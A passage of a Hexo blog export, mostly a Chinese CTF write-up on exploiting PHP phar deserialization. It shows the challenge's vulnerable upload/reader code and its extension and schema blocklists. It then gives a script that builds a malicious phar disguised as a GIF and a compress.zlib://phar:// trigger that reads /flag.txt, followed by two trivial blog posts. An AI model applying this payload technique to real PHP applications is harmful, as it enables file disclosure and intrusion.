class="variable">$this</span>-&gt;password=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> login()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;mysqli=new mysqli(<span class="variable">$this</span>-&gt;hostname, <span class="variable">$this</span>-&gt;dbuser, <span class="variable">$this</span>-&gt;dbpass, <span class="variable">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="variable">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select id,password from users where username=?&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable">$this</span>-&gt;mysqli-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_result(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;fetch();</span><br><span class="line">        <span class="variable">$result</span>-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="variable">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="variable">$this</span>-&gt;name;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class Upload&#123;</span><br><span class="line">    public <span class="variable">$flag</span>;</span><br><span class="line">    public <span class="variable">$file</span>;</span><br><span class="line">    public <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;flag = 1;</span><br><span class="line">        <span class="variable">$this</span>-&gt;black_list = [<span class="string">&#x27;ph&#x27;</span>, <span class="string">&#x27;ht&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;pe&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;co&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;\&#x27;&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">check</span></span>()&#123;</span><br><span class="line">        <span class="variable">$ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], strpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">        <span class="variable">$reg</span>=implode(<span class="string">&quot;|&quot;</span>,<span class="variable">$this</span>-&gt;black_list);</span><br><span class="line">        <span class="variable">$reg</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$reg</span> . <span class="string">&quot;\x|\s|[\x01-\x20]/i&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="variable">$reg</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;flag = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;ext = <span class="variable">$ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;flag = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">upload</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;check();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;flag)&#123;</span><br><span class="line">            <span class="keyword">if</span>(isset(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; 0)&#123;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; 10240)&#123;</span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;too big&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$new_addr</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>] . <span class="string">&quot;/upload/&quot;</span> . md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="variable">$this</span>-&gt;ext;</span><br><span class="line">                            <span class="built_in">echo</span> <span class="variable">$new_addr</span>;</span><br><span class="line">                            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$new_addr</span>);</span><br><span class="line">                            <span class="built_in">return</span> <span class="variable">$new_addr</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;Noooooooooooooooooooooooooooo!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public <span class="variable">$filename</span>;</span><br><span class="line">    public <span class="variable">$result</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="built_in">read</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            die(<span class="string">&quot;想多了嗷&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/sh/i&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            die(<span class="string">&quot;nooooooooooo!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            die(<span class="string">&quot;Invid Schema!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">echo</span> file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> __set(<span class="variable">$name</span>,<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> file_get_contents(<span class="variable">$val</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$id</span>;</span><br><span class="line">    public <span class="variable">$age</span>=null;</span><br><span class="line">    public <span class="variable">$nickname</span>=null;</span><br><span class="line">    public <span class="variable">$backup</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;nickname=new Reader();</span><br><span class="line">        <span class="variable">$this</span>-&gt;backup=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$token</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;token=new User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public <span class="variable">$filename</span>;</span><br><span class="line">    public <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$lh</span> = new dbCtrl();</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$lh</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">@rename(<span class="string">&quot;phar.phar&quot;</span>,<span class="string">&quot;lh.gif&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到phar文件，改为gif文件上传得到路径<br><img src="/images/web/phar9.jpg" alt="direct"><br>然后在read页面进行读取，因为读文件时对schema有过滤，利用压缩过滤器触发phar即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">compress.zlib://phar:///var/www/html2/upload/1b33718042e7dfe8fac079be96ebc4d9.gif</span><br></pre></td></tr></table></figure>
<p>成功读取根目录下flag.txt文件的内容<br><img src="/images/web/phar10.jpg" alt="direct"><br><img src="/images/web/phar11.jpg" alt="direct"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/09/20/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>我的第一篇博客</title>
    <url>/2020/09/21/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这是我使用hexo搭的第一篇博客，今天是2020年9月21日</p>
<h2 id="First"><a href="#First" class="headerlink" title="First"></a>First</h2>
    <div id="aplayer-otgDnFen" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="355995" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>
<h3 id="I-want-to-say-but-there-is-nothing-to-say"><a href="#I-want-to-say-but-there-is-nothing-to-say" class="headerlink" title="I want to say , but there is nothing to say"></a>I want to say , but there is nothing to say</h3><p>植根于内心的修养，无需提醒的自觉，以约束为前提的自由，为他人着想的善良 –梁晓声曾这样概括文化二字<br><img src="/images/nanfei.jpg" alt="direct"></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
